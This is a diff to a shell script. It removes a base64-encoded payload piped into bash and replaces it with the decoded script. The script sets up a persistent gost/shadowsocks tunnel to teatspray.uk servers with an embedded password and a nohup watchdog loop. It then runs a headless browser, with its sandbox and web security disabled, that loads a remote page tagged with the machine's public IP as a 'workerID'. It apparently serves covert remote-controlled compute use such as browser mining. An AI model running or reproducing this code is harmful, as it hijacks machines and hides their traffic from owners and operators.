@@ -1,1 +1,92 @@
-base64 -d <<<< Z29zdCAtTD06MTA4MiAtRj1zczovL2Flcy0xMjgtY2ZiOm1pa3JvdGlrOTk5QGNwdXNvY2tzJChzaHVmIC1pIDEtNiAtbiAxKS50ZWF0c3ByYXkudWs6ODQ0MyAmCgpzbGVlcCAyCgpjdXJsIC1zIC14IHNvY2tzNWg6Ly8xMjcuMC4wLjE6MTA4MiBhcGkuaXBpZnkub3JnCgpzbGVlcCAyCgplY2hvICJTdGFydGluZyBwcm94eSBoZWFsdGggY2hlY2tlci4uLiIKc3RkYnVmIC1vIEwgbm9odXAgYmFzaCAtYyAnCndoaWxlIHRydWUKZG8KICAgICMgVXNlIGEgdmFyaWFibGUgZm9yIHRoZSBjdXJsIG91dHB1dCBzbyB5b3UgY2FuIGNoZWNrIGFuZCBwcmludAogICAgQ1VSTF9PVVQ9JChjdXJsIC1zTCAteCBzb2NrczVoOi8vMTI3LjAuMC4xOjEwODIgLXcgIiV7aHR0cF9jb2RlfSIgaHR0cDovL2FwaS5pcGlmeS5vcmcgLW8gL2Rldi9udWxsKQogICAgCiAgICBpZiBbICIkQ1VSTF9PVVQiID0gIjIwMCIgXTsgdGhlbgogICAgICAgIGVjaG8gIiQoZGF0ZSk6IGdvc3QgaXMgc3RpbGwgb25saW5lIgogICAgZWxzZQogICAgICAgIGVjaG8gIiQoZGF0ZSk6IGdvc3QgaXMgb2ZmbGluZS4gQXR0ZW1wdGluZyB0byByZXN0YXJ0Li4uIgogICAgICAgIAogICAgICAgIHBraWxsIGdvc3QKICAgICAgICAKICAgICAgICBuZXdfc2VydmVyPSJzczovL2Flcy0xMjgtY2ZiOm1pa3JvdGlrOTk5QGNwdXNvY2tzJChzaHVmIC1pIDEtNiAtbiAxKS50ZWF0c3ByYXkudWs6ODQ0MyIKICAgICAgICBlY2hvICJSZXN0YXJ0aW5nIGdvc3Qgd2l0aCBuZXcgc2VydmVyOiAkbmV3X3NlcnZlciIKICAgICAgICBzdGRidWYgLW8gTCBub2h1cCBnb3N0IC1MPXNvY2tzNTovLzEyNy4wLjAuMToxMDgyIC1GPSIkbmV3X3NlcnZlciIgPiBnb3N0LmxvZyAyPiYxICYKICAgICAgICAKICAgICAgICBzbGVlcCA1CiAgICAgICAgCiAgICAgICAgZWNobyAiTmV3IGdvc3QgcHJvY2VzcyBzdGFydGVkLiBDaGVja2luZyBjb25uZWN0aXZpdHkuLi4iCiAgICAgICAgY3VybCAteCBzb2NrczVoOi8vMTI3LjAuMC4xOjEwODIgaHR0cDovL2FwaS5pcGlmeS5vcmcKICAgIGZpCiAgICBzbGVlcCA2MDAKZG9uZQonID4+IHByb3h5X2NoZWNrZXIubG9nIDI+JjEgJgoKZWNobyAiUHJveHkgYW5kIGhlYWx0aCBjaGVja2VyIGlzIHJ1bm5pbmcuIgoKc2xlZXAgMgoKY2F0ID4gcnVuX3B5cHBldGVlci5weSA8PEVPRgppbXBvcnQgb3MKaW1wb3J0IHNvY2tldAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQgc3RyaW5nCmltcG9ydCB0aW1lCmltcG9ydCBvcy5wYXRoCmltcG9ydCBhc3luY2lvIApmcm9tIHB5cHBldGVlciBpbXBvcnQgbGF1bmNoCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpudW1fb2ZfY29yZXMgPSBvcy5jcHVfY291bnQoKQpjdXJyZW50ZGF0ZSA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCclZC0lYi0lWV9SZW5QeXBwXycpCmlwYWRkcmVzcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJykudGV4dAp1bmRlcnNjb3JlZF9pcCA9IGlwYWRkcmVzcy5yZXBsYWNlKCcuJywgJ18nKQpjdXJyZW50ZGF0ZSArPSB1bmRlcnNjb3JlZF9pcApjaGFycyA9IHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz0xMDApCnJhbmRvbV93b3JkID0gIiIuam9pbihjaGFyc1s6OF0pCmN1cnJlbnRkYXRlICs9IHJhbmRvbV93b3JkCgoKcHJpbnQoZiJZb3VyIGN1cnJlbnQgZGF0ZSBpcyBmcm9tIHdpdGhpbiBQeXRob24gZW52aXJvbm1lbnQgaXMgOiB7Y3VycmVudGRhdGV9IikKCgphc3luYyBkZWYgZmV0Y2goKToKICAgYnJvd3NlciA9IGF3YWl0IGxhdW5jaCgKICAgICAgICBoZWFkbGVzcz1UcnVlLAogICAgICAgIGFyZ3M9WyctLW5vLXNhbmRib3gnLAogICAgICAgICAgJy0tZGlzYWJsZS1zZXR1aWQtc2FuZGJveCcsCiAgICAgICAgICAnLS1pZ25vcmUtY2VydGlmaWNhdGUtZXJyb3JzJywKICAgICAgICAgICctLWlnbm9yZS1jZXJ0aWZpY2F0ZS1lcnJvcnMtc3BraS1saXN0JywKICAgICAgICAgICctLWRpc2FibGUtZGV2LXNobS11c2FnZScsCiAgICAgICAgICAnLS1kaXNhYmxlLWluZm9iYXJzJywKICAgICAgICAgICctLWRpc2FibGUtZXh0ZW5zaW9ucycsCiAgICAgICAgICAnLS1kaXNhYmxlLWJhY2tncm91bmQtdGltZXItdGhyb3R0bGluZycsCiAgICAgICAgICAnLS1kaXNhYmxlLWJhY2tncm91bmQtbmV0d29ya2luZycsCiAgICAgICAgICAnLS1kaXNhYmxlLXdlYi1zZWN1cml0eScsCiAgICAgICAgICAnLS1kaXNhYmxlLWdwdScsCgkJICAnLS1wcm94eS1zZXJ2ZXI9c29ja3M1Oi8vMTI3LjAuMC4xOjEwODInXSwKICAgICAgICBhdXRvQ2xvc2U9RmFsc2UKICAgKQogICBwYWdlID0gYXdhaXQgYnJvd3Nlci5uZXdQYWdlKCkKICAgdXJsID0gZiJodHRwOi8vc2luZGlsZXNpcWhhenRyYWluaW5nLnRlYXRzcHJheS51ay90ZXN0Lmh0bWw/d29ya2VySUQ9e2N1cnJlbnRkYXRlfSIKICAgYXdhaXQgcGFnZS5nb3RvKHVybCkKCgphc3luY2lvLmdldF9ldmVudF9sb29wKCkucnVuX3VudGlsX2NvbXBsZXRlKGZldGNoKCkpCkVPRgoKc2xlZXAgNAoKcHl0aG9uMyBydW5fcHlwcGV0ZWVyLnB5 | bash
+gost -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:8443 &
+
+sleep 2
+
+curl -s -x socks5h://127.0.0.1:1082 api.ipify.org
+
+sleep 2
+
+echo "Starting proxy health checker..."
+stdbuf -o L nohup bash -c '
+while true
+do
+    # Use a variable for the curl output so you can check and print
+    CURL_OUT=$(curl -sL -x socks5h://127.0.0.1:1082 -w "%{http_code}" http://api.ipify.org -o /dev/null)
+    
+    if [ "$CURL_OUT" = "200" ]; then
+        echo "$(date): gost is still online"
+    else
+        echo "$(date): gost is offline. Attempting to restart..."
+        
+        pkill gost
+        
+        new_server="ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:8443"
+        echo "Restarting gost with new server: $new_server"
+        stdbuf -o L nohup gost -L=socks5://127.0.0.1:1082 -F="$new_server" > gost.log 2>&1 &
+        
+        sleep 5
+        
+        echo "New gost process started. Checking connectivity..."
+        curl -x socks5h://127.0.0.1:1082 http://api.ipify.org
+    fi
+    sleep 600
+done
+' >> proxy_checker.log 2>&1 &
+
+echo "Proxy and health checker is running."
+
+sleep 2
+
+cat > run_pyppeteer.py <<EOF
+import os
+import socket
+import requests
+import random
+import string
+import time
+import os.path
+import asyncio 
+from pyppeteer import launch
+from datetime import datetime
+
+num_of_cores = os.cpu_count()
+currentdate = datetime.now().strftime('%d-%b-%Y_RenPypp_')
+ipaddress = requests.get('https://api.ipify.org').text
+underscored_ip = ipaddress.replace('.', '_')
+currentdate += underscored_ip
+chars = random.choices(string.ascii_letters + string.digits, k=100)
+random_word = "".join(chars[:8])
+currentdate += random_word
+
+
+print(f"Your current date is from within Python environment is : {currentdate}")
+
+
+async def fetch():
+   browser = await launch(
+        headless=True,
+        args=['--no-sandbox',
+          '--disable-setuid-sandbox',
+          '--ignore-certificate-errors',
+          '--ignore-certificate-errors-spki-list',
+          '--disable-dev-shm-usage',
+          '--disable-infobars',
+          '--disable-extensions',
+          '--disable-background-timer-throttling',
+          '--disable-background-networking',
+          '--disable-web-security',
+          '--disable-gpu',
+		  '--proxy-server=socks5://127.0.0.1:1082'],
+        autoClose=False
+   )
+   page = await browser.newPage()
+   url = f"http://sindilesiqhaztraining.teatspray.uk/test.html?workerID={currentdate}"
+   await page.goto(url)
+
+
+asyncio.get_event_loop().run_until_complete(fetch())
+EOF
+
+sleep 4
+
+python3 run_pyppeteer.py
